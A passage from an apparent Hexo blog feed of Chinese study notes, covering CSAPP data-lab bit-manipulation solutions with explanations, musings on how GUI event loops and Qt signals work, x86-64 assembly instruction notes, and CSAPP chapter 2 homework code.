class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h4><ul><li>直接取反再加1</li></ul><h3 id="isPositive"><a href="#isPositive" class="headerlink" title="isPositive"></a>isPositive</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Example: isPositive(-1) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isPositive</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(x&gt;&gt;<span class="number">31</span>)&amp;!!x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h4><ul><li>符号位判断，并且非0</li></ul><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !!(x&gt;&gt;<span class="number">31</span>&amp;~(y&gt;&gt;<span class="number">31</span>)) | !(~(x&gt;&gt;<span class="number">31</span>)&amp;(y&gt;&gt;<span class="number">31</span>))&amp;(x+~y+<span class="number">1</span>&gt;&gt;<span class="number">31</span>) | !(x^y);</span><br><span class="line"><span class="comment">//equal to  !!(x&gt;&gt;31&amp;~(y&gt;&gt;31)) | !(~(x&gt;&gt;31)&amp;(y&gt;&gt;31))&amp;(x-y&gt;&gt;31) | !(x^y)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h4><ul><li><code>x&lt;0&amp;&amp;y&gt;0 | !(x&gt;0&amp;&amp;y&lt;0)&amp;&amp;(x-y&gt;0) | x==y</code></li></ul><h3 id="ilog2"><a href="#ilog2" class="headerlink" title="ilog2"></a>ilog2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span></span><br><span class="line"><span class="comment"> *   Example: ilog2(16) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 90</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> mark1 = <span class="number">0x55</span>;</span><br><span class="line"><span class="keyword">int</span> mark2 = <span class="number">0x33</span>;</span><br><span class="line"><span class="keyword">int</span> mark3 = <span class="number">0x0F</span>;</span><br><span class="line">mark1 |= mark1&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark1 |= mark1&lt;&lt;<span class="number">16</span>;</span><br><span class="line">mark2 |= mark2&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark2 |= mark2&lt;&lt;<span class="number">16</span>;</span><br><span class="line">mark3 |= mark3&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark3 |= mark3&lt;&lt;<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">x |= x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">2</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">4</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">8</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">16</span>;</span><br><span class="line">x &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">x = (x&gt;&gt;<span class="number">1</span>&amp;mark1)+(x&amp;mark1);<span class="comment">//every two bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">2</span>&amp;mark2)+(x&amp;mark2);<span class="comment">//every four bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">4</span>&amp;mark3)+(x&amp;mark3);<span class="comment">//every eight bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">8</span>)+x;<span class="comment">//every 16 bits; record in the low 8 bits;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">16</span>)+x;<span class="comment">//every 32 bits; record in the low 8 bits;</span></span><br><span class="line"><span class="keyword">return</span> x&amp;<span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h4><ul><li>先构造从最高的1到最低位均为1的二进制，然后类似bitCount</li></ul><h3 id="float-neg"><a href="#float-neg" class="headerlink" title="float_neg"></a>float_neg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_neg - Return bit-level equivalent of expression -f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_neg</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> t = uf&amp;<span class="number">0x7FFFFFFF</span>;</span><br><span class="line"><span class="keyword">if</span>(t^<span class="number">0x7F800000</span> &amp;&amp; (t&gt;&gt;<span class="number">23</span>)+<span class="number">1</span>&gt;&gt;<span class="number">8</span>)</span><br><span class="line"><span class="keyword">return</span> uf;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">return</span> uf^<span class="number">0x80000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h4><ul><li>判别是否是NaN。先判断尾数是否全0，然后用<code>(t&gt;&gt;23)+1&gt;&gt;8</code>判断exp是否全1</li></ul><h3 id="float-i2f"><a href="#float-i2f" class="headerlink" title="float_i2f"></a>float_i2f</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span></span><br><span class="line"><span class="comment"> *   Result is returned as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> shiftLeft=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> afterShift, tmp, flag;</span><br><span class="line">    <span class="keyword">unsigned</span> absX=x;</span><br><span class="line">    <span class="keyword">unsigned</span> sign=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//special case</span></span><br><span class="line">    <span class="keyword">if</span> (x==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//if x &lt; 0, sign = 1000...,abs_x = -x</span></span><br><span class="line">    <span class="keyword">if</span> (x&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sign=<span class="number">0x80000000</span>;</span><br><span class="line">        absX=-x;</span><br><span class="line">    &#125;</span><br><span class="line">    afterShift=absX;</span><br><span class="line">    <span class="comment">//count shift_left and after_shift</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp=afterShift;</span><br><span class="line">        afterShift&lt;&lt;=<span class="number">1</span>;</span><br><span class="line">        shiftLeft++;</span><br><span class="line">        <span class="keyword">if</span> (tmp &amp; <span class="number">0x80000000</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((afterShift &amp; <span class="number">0x01ff</span>)&gt;<span class="number">0x0100</span>)</span><br><span class="line">        flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((afterShift &amp; <span class="number">0x03ff</span>)==<span class="number">0x0300</span>)</span><br><span class="line">        flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        flag=<span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> sign + (afterShift&gt;&gt;<span class="number">9</span>) + ((<span class="number">159</span>-shiftLeft)&lt;&lt;<span class="number">23</span>) + flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//from http://www.cnblogs.com/tenlee/p/4951639.html</span></span><br></pre></td></tr></table></figure><h4 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h4><ul><li><p>分情况处理0、负数、正数</p></li><li><p>要处理舍人</p><blockquote><ul><li>向接近的舍入</li><li>如果处于中间，向偶数舍入</li></ul></blockquote></li><li><p>舍入时，如果尾数加一，exp有可能需要进位，这时候直接加一效果一样，可以导致exp进位，不需要特殊处理。如果exp等于0xFE，那么进位就变成了inf，也是合法的</p></li></ul><h3 id="float-twict"><a href="#float-twict" class="headerlink" title="float_twict"></a>float_twict</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> t = uf&amp;<span class="number">0x7FFFFFFF</span>;</span><br><span class="line"><span class="keyword">unsigned</span> temp = t&amp;<span class="number">0x7F800000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> temp2 = uf&amp;<span class="number">0xFF800000</span>;</span><br><span class="line"><span class="keyword">int</span> expFull = !(temp^<span class="number">0x7F800000</span>);</span><br><span class="line"><span class="keyword">if</span>(t^<span class="number">0x7F800000</span> &amp;&amp; expFull)</span><br><span class="line"><span class="keyword">return</span> uf;</span><br><span class="line"><span class="keyword">if</span>(expFull)&#123;</span><br><span class="line"><span class="keyword">return</span> temp2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(t&amp;<span class="number">0x7F800000</span>))&#123;</span><br><span class="line"><span class="keyword">unsigned</span> k = (uf&amp;<span class="number">0x7FFFFF</span>);</span><br><span class="line"><span class="keyword">return</span> temp2+(k&lt;&lt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (temp&gt;&gt;<span class="number">23</span>)+<span class="number">1</span>&lt;&lt;<span class="number">23</span> | uf&amp;<span class="number">0x807FFFFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h4><ul><li>分情况处理三种IEEE754的情况</li><li>需要注意exp全0时，乘以二就是尾数乘以二，如果发生进位需要exp进位，不需要特殊处理（第三个if），因为进位直接导致exp加一，这就足够了</li></ul>]]></content>
    
    <summary type="html">
    
      CSAPP 数据实验的解答
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="CSAPP Lab" scheme="https://h-zex.github.io/tags/CSAPP-Lab/"/>
    
  </entry>
  
  <entry>
    <title>初学GUI的一些理解（瞎猜）</title>
    <link href="https://h-zex.github.io/2017/08/11/%E5%88%9D%E5%AD%A6GUI%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3%EF%BC%88%E7%9E%8E%E7%8C%9C%EF%BC%89/"/>
    <id>https://h-zex.github.io/2017/08/11/初学GUI的一些理解（瞎猜）/</id>
    <published>2017-08-11T10:15:36.000Z</published>
    <updated>2019-07-02T15:43:51.401Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>应该把整个程序运行过程分解为：</p><ol><li>描述一个界面(前端)</li></ol><ul><li>show出来</li><li>进入无限循环</li><li>在循环里按照刷新频率show这个界面</li><li>每次循环里还检测是否有输入，如果没有，就继续下一次循环</li><li>如果有，就像控制台程序一样，接受输入，给出输出</li><li>当遇到销毁窗口的输入时，退出循环(从而不再show，也不再处理输入，并且从main return回去，被操作系统回收了申请的内存以及画笔权限之类的资源)</li></ul></li><li><p>也就是说，我把一个窗口程序分解为</p><ol><li>定义图形</li><li>重复画图</li><li>对输入给出输出的类似控制台程序</li></ol></li></ul><ul><li>在main函数，我在栈上(或者堆上)申请了几个类变量，这些变量是我的窗口的组件，设置他们的各种属性(比如外观)，设置他们的从属关系，然后把他们用layout布局好，用show函数显示出来。显示出来的是一个图形，当然，类不止有外观方面的属性，所以这其实是一个前端</li><li>进入消息循环，这个图形一直显示着(不知道是不是按照刷新频率不断地执行show函数)</li><li>以上就完成了在屏幕上一直显示一个图形的任务，然后，接下来的任务就是这个程序接受输入，然后输出结果的过程。</li><li>接受的输入有: 键盘、鼠标等等的输入，又或者说这些输入设备他们的状态持续性(被读取的时间点是离散的)、间歇性地被系统函数读取，然后，如果我们的鼠标点击了我们写的这个窗口程序的某个按钮，就会把这个状态PUSH进我们的程序的消息队列，而因为我们的程序在消息循环中一直扫描该队列，所以主程序可以读到输入，并把输入分发给组件(也就是调用组件的函数，把输入作为参数传给函数)</li><li>如果前后端不分离，那么我们可以直接在组件里定义函数，这些函数对输入给出输出，然后直接输出来</li><li>但是，这样程序就不解耦了，这样我们要对输入到输出的映射进行修改就需要修改这个组件的类成员函数</li><li>如果我们换一种实现方式，组件接收到输入(也就是自己接受输入的函数被调用)后把自己的状态的变化发射出去(用SIGNAL函数)</li><li>所谓发射出去，我猜测如下<ol><li>GoF观察者模式的经典实现(就是每个组件的消息接收函数都调用一次)</li><li>组件也有消息循环(这或许需要多线程，毕竟主程序在进行消息循环，如果组件也无线循环那要跑哪个循环)</li><li>把该消息放在共享的那块内存，然后每个组件都执行一次消息循环</li></ol></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;p&gt;应该把整个程序运行过程分解为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;描述一个界面(前端)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;show出来&lt;/li&gt;
&lt;li&gt;进入无限循环&lt;/li&gt;
&lt;li&gt;在循环里按照刷新频率show这个界面&lt;/li&gt;
&lt;li&gt;每次循环里还检测
      
    
    </summary>
    
      <category term="开发" scheme="https://h-zex.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="GUI" scheme="https://h-zex.github.io/tags/GUI/"/>
    
      <category term="Qt" scheme="https://h-zex.github.io/tags/Qt/"/>
    
  </entry>
  
  <entry>
    <title>汇编相关</title>
    <link href="https://h-zex.github.io/2017/08/06/%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3/"/>
    <id>https://h-zex.github.io/2017/08/06/汇编相关/</id>
    <published>2017-08-06T14:35:44.000Z</published>
    <updated>2019-07-02T15:43:51.777Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MOV"><a href="#MOV" class="headerlink" title="MOV"></a>MOV</h4><ul><li>操作数不能都是memory</li><li>register must match the suffix</li><li>movq 的立即数必须再32bit补码能表示的范围内，然后该立即数被符号扩展</li><li>movabsq可以有任意的64bit立即数（没有明确指出是否是补码），但是destination必须是register</li><li>movz、movs系列have a register or memory location as the source and a register as the destination.</li><li>cltq: SignExtend(%eax) -&gt; %rax</li><li>movzlq不存在，可以用movl实现。<strong>但是movzbq、movzwq为什么存在，不是可以用movzbl、movzwl实现（practice problem3.4第四题）。同样的，sal、shl为什么同时存在</strong></li></ul><h4 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h4><ul><li>leaq:<ul><li>has no other size variants</li><li>The destination operand must be a register.</li></ul></li><li>Unary Operations:<ul><li>operand can be either a register or a memory location. </li></ul></li><li>Binary Operations:<ul><li>the second operand is used as both a source and a destination</li><li>the first operand can be either an immediate value, a register, or a memory location. The second can be either a register or a memory location.</li><li>the two operands can’t both be memory location</li><li>when the second operand is a memory location, the processor must read the value from memory, perform the operation, and then write the result back to memory.</li></ul></li><li>Shift Operations<ul><li>shift amount is given first and the value to shift is given second. 因为第二个操作数是register或者memory location，所以不能用立即数作为the value to shift</li><li>shift amount can be imm value or %cl</li><li>a shift instruction operating on data values that are w bits long determines the shift amount from the low-order m bits of register %cl, where $2^m=w$. The higher-order bits are ignored.For example, when register %cl has hexadecimal value 0xFF, then instruction salb would shift by 7, while salw would shift by 15, sall would shift by 31, and salq would shift 63</li><li>destination can be register or memory location</li></ul></li></ul><h2 id="浮点指令"><a href="#浮点指令" class="headerlink" title="浮点指令"></a>浮点指令</h2><ul><li>vmovss, vmovd的操作数可以是（第一个source，第二个destination）<ul><li>memory， XMM</li><li>XMM， memory</li><li>按照书上的描述，好像还可以XMM， XMM</li></ul></li><li>vmovaps, vmovapd可以从XMM to XMM，读写内存时，地址需要16字节对齐。</li><li>vcvttss2si,, vcvttss2siq的destination都是通用寄存器（非XMM）</li><li>vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq的destination都是XMM，第二个source操作数都是XMM（可能只是书上讲的情形有这个要求而已）</li><li>vunpcklps, vcvtps2pd：single to double（其实是有vcvtsd2ss）</li><li>vmovddup, vcvtpd2psx：double to single（其实是有vcvtsi2sdq）</li><li>vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss第一个source是XMM或者memory，第二个source和destination必须是XMM</li><li>vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd同样</li></ul><h4 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h4><ul><li>intel format have reverse order operands;</li><li>Different instructions allow different ranges of immediate values; the assembler will automatically select the most compact way of encoding a value </li><li>Such a reference has four components: an immediate offset Imm, a base register r<sub>b</sub>, an index register r<sub>i</sub>, and a scale factor s, where s must be 1, 2, 4, or 8. Both the base and index must be 64-bit registers.</li><li>Any instruction that generates a 32-bit value for a register also sets thehigh-order portion of the register to 0</li><li>后缀的匹配</li></ul>]]></content>
    
    <summary type="html">
    
      CSAPP提到的汇编相关知识点
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="汇编" scheme="https://h-zex.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP3e 第二章作业</title>
    <link href="https://h-zex.github.io/2017/08/06/CSAPP3e-%E7%AC%AC%E4%BA%8C%E7%AB%A0%E4%BD%9C%E4%B8%9A/"/>
    <id>https://h-zex.github.io/2017/08/06/CSAPP3e-第二章作业/</id>
    <published>2017-08-06T04:18:27.000Z</published>
    <updated>2019-07-02T15:43:52.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2-58"><a href="#2-58" class="headerlink" title="2.58"></a>2.58</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLittleEndian1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> ((<span class="keyword">char</span>*)&amp;a)[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-59"><a href="#2-59" class="headerlink" title="2.59"></a>2.59</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f2_59</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x&amp;(((<span class="number">1</span>&lt;&lt;(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)<span class="number">-1</span>)*<span class="number">8</span>)<span class="number">-1</span>)&lt;&lt;<span class="number">8</span>)|(y&amp;<span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-60"><a href="#2-60" class="headerlink" title="2.60"></a>2.60</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">replaceByte</span><span class="params">(<span class="keyword">unsigned</span> x, <span class="keyword">int</span> i, <span class="keyword">unsigned</span> <span class="keyword">char</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = ~<span class="number">0</span> - ((<span class="number">1L</span>L&lt;&lt;(i+<span class="number">1</span>&lt;&lt;<span class="number">3</span>))-(<span class="number">1</span>&lt;&lt;(i&lt;&lt;<span class="number">3</span>)));</span><br><span class="line"><span class="keyword">return</span> x&amp;t|((<span class="keyword">unsigned</span>)b&lt;&lt;(i&lt;&lt;<span class="number">3</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-61"><a href="#2-61" class="headerlink" title="2.61"></a>2.61</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">A2_61</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !(x^~<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">B2_61</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">C2_61</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((x&amp;<span class="number">0xFF</span>)^<span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">D2_61</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((<span class="keyword">unsigned</span>)x&gt;&gt;((<span class="keyword">sizeof</span>(<span class="keyword">int</span>)<span class="number">-1</span>)&lt;&lt;<span class="number">3</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-62"><a href="#2-62" class="headerlink" title="2.62"></a>2.62</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isRightShiftAreArithmetic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">-1</span>&gt;&gt;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> 